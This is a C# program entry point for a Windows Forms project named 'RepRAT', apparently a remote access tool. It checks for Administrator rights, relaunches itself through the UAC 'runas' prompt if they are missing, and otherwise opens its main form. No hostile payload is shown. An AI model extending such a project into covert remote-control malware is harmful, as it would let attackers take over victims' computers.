
using System.Diagnostics;
using System.Security.Principal;

namespace RepRAT;

static class Program
{
    /// <summary>
    ///  The main entry point for the application.
    /// </summary>
    [STAThread]
    static void Main()
    {
        // To customize application configuration such as set high DPI settings or default font,
        // see https://aka.ms/applicationconfiguration.
        bool runningAsAdmin = WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
        if (!runningAsAdmin)
        {
            try
            {
                Process proc = new Process();
                proc.StartInfo.FileName = Process.GetCurrentProcess().ProcessName + ".exe";
                proc.StartInfo.UseShellExecute = true;
                proc.StartInfo.Verb = "runas";
                proc.Start();
                Environment.Exit(0);
            }
            catch (Exception e)
            {
                Environment.Exit(0);
            }
        }
        else
        {
            ApplicationConfiguration.Initialize();
            Application.Run(new Form1());
        }
        
    }    
}